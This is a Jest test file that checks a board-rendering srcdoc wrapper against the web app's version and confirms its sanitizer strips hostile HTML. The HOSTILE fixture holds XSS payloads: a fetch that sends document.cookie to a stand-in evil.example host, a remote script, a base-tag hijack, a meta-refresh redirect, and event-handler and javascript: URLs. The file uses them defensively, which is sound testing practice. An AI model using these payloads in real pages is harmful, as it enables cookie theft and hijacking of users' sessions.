/**
 * DRIFT GUARD — the document the API sends the board renderer must be the one a
 * screen gets. The web owns the srcdoc wrapper and its two runtimes
 * (apps/web/src/lib/designer-safe-srcdoc.ts); the API carries byte-for-byte
 * copies (designer-render-document.ts). This spec loads the WEB module straight
 * from source — transpiled with TypeScript, the same way the renderer's own
 * integration suite does (apps/renderer/test/helpers/runtimes.ts) — and:
 *
 *   1. compares both runtime constants byte for byte;
 *   2. runs the web's buildSafeDesignerSrcdoc beside the API's wrapper over a
 *      corpus (real boards from both packages' fixtures, a kept-board shape,
 *      a hostile document, head-less documents) with one pinned nonce, and
 *      demands identical output;
 *   3. checks assembleDesignerRenderDocument = the renderer suite's
 *      assembleLikeTheProduct pipeline, exactly.
 *
 * If the web file changes a runtime, this goes red and names it: copy the
 * constant back (never hand-edit the API copy).
 */
import fs from 'node:fs';
import path from 'node:path';
import * as ts from 'typescript';
import {
  assembleDesignerRenderDocument,
  LIVE_MENU_RUNTIME,
  STAGE_SCALE_RUNTIME,
  wrapDesignerSrcdoc,
} from './designer-render-document';
import {
  DESIGNER_LAYOUT_ENGINE,
  injectDesignerEditShim,
  injectDesignerLayoutEngine,
} from './designer-edit-shim';
import { sanitizeDesignerHtml } from './designer-prompt';

const REPO = path.resolve(__dirname, '..', '..', '..', '..');
const WEB_SRCDOC = path.join(
  REPO,
  'apps',
  'web',
  'src',
  'lib',
  'designer-safe-srcdoc.ts',
);
const NONCE = 'N0NCEf1xed';

type WebSrcdoc = {
  buildSafeDesignerSrcdoc(html: string): string;
  __STAGE_SCALE_RUNTIME: string;
  __LIVE_MENU_RUNTIME: string;
};

/** The web module, from source, with its page-nonce reader pinned and its two private constants exposed. */
function loadWebSrcdoc(): WebSrcdoc {
  const source = fs.readFileSync(WEB_SRCDOC, 'utf8');
  const js =
    ts.transpileModule(source, {
      compilerOptions: {
        module: ts.ModuleKind.CommonJS,
        target: ts.ScriptTarget.ES2020,
        esModuleInterop: true,
      },
    }).outputText +
    '\nexports.__STAGE_SCALE_RUNTIME = STAGE_SCALE_RUNTIME;\nexports.__LIVE_MENU_RUNTIME = LIVE_MENU_RUNTIME;\n';
  const mod = { exports: {} as Record<string, unknown> };
  const stubs: Record<string, unknown> = {
    './csp-nonce': { readCspNonce: () => NONCE },
  };
  const req = (id: string) => {
    if (id in stubs) return stubs[id];
    throw new Error(
      `designer-safe-srcdoc.ts requires ${id}; this loader does not provide it`,
    );
  };
  // eslint-disable-next-line @typescript-eslint/no-implied-eval
  const run = new Function('exports', 'require', 'module', js) as (
    exports: unknown,
    require: unknown,
    module: unknown,
  ) => void;
  run(mod.exports, req, mod);
  return mod.exports as unknown as WebSrcdoc;
}

const web = loadWebSrcdoc();
const read = (...p: string[]) => fs.readFileSync(path.join(REPO, ...p), 'utf8');
const superTaco = sanitizeDesignerHtml(
  read(
    'apps',
    'api',
    'src',
    'ai',
    '__fixtures__',
    'super-taco-burritos.board.html',
  ),
).html;
const crowded = sanitizeDesignerHtml(
  read('apps', 'renderer', 'test', 'fixtures', 'crowded-ai-board.html'),
).html;

const HOSTILE =
  '<!doctype html><html><head><meta charset="utf-8"><meta data-vos-csp="1" http-equiv="Content-Security-Policy" content="default-src *">' +
  '<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">' +
  '<script>fetch("https://evil.example/"+document.cookie)</script>' +
  '<script>/*VOS-FIT-ENGINE*/fetch("https://evil.example/")</script>' +
  '<script src="https://evil.example/x.js"/></head>' +
  '<body onload="evil()"><div class="stage"><a href="javascript:evil()" data-field="cta">Tap</a>' +
  '<img src="https://ok.example/a.png" onerror="evil()"><iframe src="https://evil.example"></iframe>' +
  '<object data="x"></object><embed src="y"></div></body></html>';

const CORPUS: Array<[string, string]> = [
  [
    'the Super Taco board, fit engine baked in (4K)',
    injectDesignerLayoutEngine(superTaco, 3840, 2160),
  ],
  [
    "the renderer's crowded AI board, fit engine baked in",
    injectDesignerLayoutEngine(crowded, 3840, 2160),
  ],
  [
    'a KEPT board shape: V7 edit shim + fit engine',
    injectDesignerLayoutEngine(injectDesignerEditShim(superTaco), 1920, 1080),
  ],
  ['a hostile document (every strip path)', HOSTILE],
  [
    'no <head>, has <html>',
    '<html><body><div class="stage"><h1 data-field="h">Hi</h1></div></body></html>',
  ],
  ['a bare fragment', '<div class="stage"><h1 data-field="h">Hi</h1></div>'],
  [
    'an old fit engine body under the current marker (fail closed)',
    superTaco.replace(
      '</body>',
      '<script>/*VOS-FIT-ENGINE*/(function(){})();</script></body>',
    ),
  ],
];

describe('designer-render-document — a byte-for-byte copy of what a screen renders', () => {
  it("VOS-STAGE-SCALE is the web's constant, byte for byte", () => {
    expect(STAGE_SCALE_RUNTIME).toBe(web.__STAGE_SCALE_RUNTIME);
  });

  it("VOS-LIVE-MENU is the web's constant, byte for byte (the V7 parent-only guard included)", () => {
    expect(LIVE_MENU_RUNTIME).toBe(web.__LIVE_MENU_RUNTIME);
    expect(LIVE_MENU_RUNTIME).toContain('if(e.source!==window.parent)return;');
  });

  it.each(CORPUS)(
    "the wrapper matches the web's buildSafeDesignerSrcdoc exactly: %s",
    (_name, doc) => {
      expect(wrapDesignerSrcdoc(doc, NONCE)).toBe(
        web.buildSafeDesignerSrcdoc(doc),
      );
    },
  );

  it("assembleDesignerRenderDocument = the renderer suite's assembleLikeTheProduct pipeline", () => {
    for (const [w, h] of [
      [3840, 2160],
      [2160, 3840],
      [1920, 1080],
    ]) {
      expect(assembleDesignerRenderDocument(superTaco, w, h, NONCE)).toBe(
        web.buildSafeDesignerSrcdoc(
          injectDesignerLayoutEngine(superTaco, w, h),
        ),
      );
    }
  });

  it('keeps our runtimes nonce-stamped and strips everything else', () => {
    const out = wrapDesignerSrcdoc(HOSTILE, NONCE);
    expect(out).not.toContain('evil.example/"+document.cookie');
    expect(out).not.toMatch(
      /onload=|onerror=|javascript:|<iframe|<object|<embed|<base|http-equiv="refresh"/i,
    );
    expect(out).not.toContain('default-src *');
    const doc = assembleDesignerRenderDocument(superTaco, 3840, 2160, NONCE);
    expect(doc).toContain(
      `<script nonce="${NONCE}">${DESIGNER_LAYOUT_ENGINE.slice('<script>'.length)}`,
    );
    expect(doc).toContain(
      `<script nonce="${NONCE}">/*VOS-CANVAS*/window.__VOS_CW=3840;window.__VOS_CH=2160;</script>`,
    );
    expect(doc.indexOf('data-vos-csp')).toBeLessThan(doc.indexOf('<style'));
    expect((doc.match(/<script\b/g) || []).length).toBe(4); // canvas dims, fit engine, stage scale, live menu
  });

  it('a fresh nonce per document by default', () => {
    const a = assembleDesignerRenderDocument(superTaco, 3840, 2160);
    const b = assembleDesignerRenderDocument(superTaco, 3840, 2160);
    const nonceOf = (d: string) => (d.match(/'nonce-([0-9a-f]+)'/) || [])[1];
    expect(nonceOf(a)).toMatch(/^[0-9a-f]{32}$/);
    expect(nonceOf(a)).not.toBe(nonceOf(b));
  });
});
